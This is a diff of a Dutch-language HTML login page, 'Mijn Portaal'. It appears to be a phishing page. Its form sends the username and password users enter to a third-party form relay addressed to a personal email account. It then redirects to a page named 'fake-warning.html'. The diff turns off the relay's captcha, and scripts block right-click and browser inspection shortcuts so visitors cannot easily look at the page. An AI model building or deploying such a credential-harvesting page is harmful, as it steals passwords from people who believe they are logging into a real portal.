@@ -2,7 +2,7 @@
 <html lang="nl">
 <head>
   <meta charset="UTF-8">
-  <title>Login Portaal</title>
+  <title>Mijn Portaal</title>
   <style>
     body {
       background-color: #111;
@@ -18,37 +18,39 @@
       color: #0f0;
       border: none;
     }
-    #result {
-      display: none;
-      margin-top: 30px;
-      color: red;
+    input::placeholder {
+      color: #0f0;
     }
   </style>
 </head>
 <body>
-  <h2>Login bij Mijn Portaal</h2>
-  <form action="https://formsubmit.co/matteogoossens@tuta.io" method="POST" id="loginForm">
+  <h2>Welkom bij Mijn Portaal</h2>
+
+  <form action="https://formsubmit.co/matteogoossens@tuta.io" method="POST">
     <input type="text" name="username" placeholder="Gebruikersnaam" required><br>
     <input type="password" name="password" placeholder="Wachtwoord" required><br>
-    <input type="hidden" name="_next" value="https://gooske28.github.io/mijnportaal/fake-warning.html">
+    
+    <input type="hidden" name="_next" value="fake-warning.html">
+    <input type="hidden" name="_captcha" value="false">
+    
     <button type="submit">Inloggen</button>
   </form>
-  
-  <script>
-        // Beveiliging tegen rechtsklikken (contextmenu uitschakelen)
-        document.addEventListener('contextmenu', (event) => event.preventDefault());
 
-        // Beveiliging tegen inspectietools (F12, Ctrl+Shift+I en Ctrl+U uitschakelen)
-        document.addEventListener('keydown', function(event) {
-            if (
-                event.key === 'F12' || 
-                (event.ctrlKey && event.shiftKey && event.key === 'I') ||
-                (event.ctrlKey && event.key === 'u') // Blokkeer Ctrl + U
-            ) {
-                event.preventDefault();
-                alert("Deze actie is uitgeschakeld!");
-            }
-        });
+  <script>
+    // Beveiliging tegen rechtsklikken (contextmenu uitschakelen)
+    document.addEventListener('contextmenu', (event) => event.preventDefault());
+
+    // Beveiliging tegen inspectietools (F12, Ctrl+Shift+I en Ctrl+U)
+    document.addEventListener('keydown', function(event) {
+      if (
+        event.key === 'F12' || 
+        (event.ctrlKey && event.shiftKey && event.key.toLowerCase() === 'i') ||
+        (event.ctrlKey && event.key.toLowerCase() === 'u')
+      ) {
+        event.preventDefault();
+        alert("Deze actie is uitgeschakeld!");
+      }
+    });
   </script>
 </body>
 </html>
